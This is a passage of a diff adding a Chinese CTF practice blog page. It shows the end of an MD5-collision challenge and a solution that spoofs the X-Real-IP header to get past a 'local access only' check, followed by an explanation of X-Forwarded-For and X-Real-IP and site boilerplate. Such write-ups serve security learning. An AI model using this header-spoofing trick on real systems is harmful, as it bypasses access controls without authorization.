+        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<p>我把数组和MD5碰撞都试了，发现没用。。。。</p>
+<p>看了wp，没错啊是md5碰撞，重新开网页测试，成功了。。。。。。。。。。。</p>
+<h1 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h1><div class="code-wrapper"><pre><code class="hljs">只允许本地访问</code></pre></div>
+
+<p>考察HTTP请求头</p>
+<p>X-Forwarded-For      Client-Ip     X-Real-IP</p>
+<p>这里要使用X-Real-IP</p>
+<p>，然后是个登录框，使用post请求带上参数即可</p>
+<h2 id="X-Forwarded-For与X-Real-IP区别"><a href="#X-Forwarded-For与X-Real-IP区别" class="headerlink" title="X-Forwarded-For与X-Real-IP区别"></a>X-Forwarded-For与X-Real-IP区别</h2><p>X-Forwarded-For能记录完整的多级代理</p>
+<p>X-Real-IP只有一个值</p>
+<p>所以 ，如果只有一层代理，这两个头的值就是一样的</p>
+<p>多级代理很少见，只有一级代理的情况下二者是等效的</p>
+<p>如果有多级代理，x-forwarded-for效果是大于x-real-ip的，可以记录完整的代理链路</p>
+<div class="code-wrapper"><pre><code class="hljs cobol">
+来自`4.4.4.4`的一个请求，header包含这样一行
+
+X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3
+      
+代表 请求由`1.1.1.1`发出，经过三层代理，第一层是`2.2.2.2`，第二层是`3.3.3.3`，而本次请求的来源IP`4.4.4.4`是第三层代理
+
+</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs csharp">而`X-Real-IP`，没有相关标准，上面的例子，如果配置了`X-Read-IP`，可能会有两种情况
+
+<span class="hljs-comment">// 最后一跳是正向代理，可能会保留真实客户端IP</span>
+
+X-Real-IP: <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>
+
+<span class="hljs-comment">// 最后一跳是反向代理，比如Nginx，一般会是与之直接连接的客户端IP X-Real-IP: 3.3.3.3</span>
+    
+如果用户访问你的 nginx反向代理之前，还经过了一层正向代理，你即使在nginx中配置了x-real-ip，取到的也只是正向代理的IP而不是客户端真实IP</code></pre></div>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Buu刷题</div>
+      <div>https://zer0peach.github.io/2023/09/08/Buu刷题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/10/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/" title="羊城杯2023">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">羊城杯2023</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/06/disable-function/" title="disable_function">
+                        <span class="hidden-mobile">disable_function</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP证123456号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备12345678号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
